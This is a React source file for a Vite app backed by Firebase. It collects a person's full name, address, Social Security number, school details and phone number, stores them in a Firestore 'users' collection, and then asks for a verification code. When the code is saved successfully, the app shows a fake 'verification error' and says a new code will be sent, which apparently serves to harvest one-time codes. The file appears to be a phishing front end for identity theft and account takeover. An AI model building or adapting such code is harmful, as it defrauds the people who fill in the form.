import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import HomePage from './homepage'
import { Routes, Route } from 'react-router-dom'
import Success from './success'
import { app , database} from './firebaseconfig'
import { collection, addDoc } from 'firebase/firestore'
import { useNavigate } from 'react-router-dom'
import FirstPage from './firstPage'
import Checkout from './checkout'
import { storage } from './firebaseconfig'

function App() {
  const [data, setData] = useState({})

  const handleUpload = (file)=> {
    console.log(data)
  }


  const collectionRef = collection(database, 'users');
  
  const [formData, setFormData] = useState({
    fullName: "",
    address: "",
    ssn:"",
    schoolName: "",
    schoolDate: "",
    phoneNumber: "",
  });

  const [formData2, setFormData2] = useState({
   
    
  });


  const navigate = useNavigate();

  function getData(event) {

     setFormData((prev)=> {
        return {
          ...prev,
          [event.target.name]: event.target.value,
        }
     })
     console.log(formData);
     
  }


  function getData2(event) {
    setFormData2((prev)=> {
       return {
         ...prev,
         [event.target.name]: event.target.value,
       }
    })
    console.log(formData2);
 }
  function handleSubmit(event) {
    event.preventDefault();
    addDoc(collectionRef, {
      fullName: formData.fullName,
      address: formData.address, 
      ssn: formData.ssn,
      schoolDate: formData.schoolDate,
      schoolName: formData.schoolName,
      phoneNumber: formData.phoneNumber,
      
    }).then(()=> {
     
       navigate("success")
      
    }).catch((err)=> {
      alert(err.message)
    })
  }

  function handleSubmit2(event) {
    event.preventDefault();
    addDoc(collectionRef, {
      code: formData2.code,
      
    }).then(()=> {
      alert("verfication Error, a new code will be sent in minutes, try again");
      console.log("yes")
    }).catch((err)=> {
      alert(err.message)
    })
  }

  return (
    <section>
     <Routes>
      
      <Route index element={<HomePage handleSubmit={handleSubmit} getData={getData} data={data} setData={setData}/>} />
      <Route path='success' element={<Success getData2={getData2} handleSubmit2={handleSubmit2}/>} />
      
     </Routes>
     
    </section>
  )
}

export default App
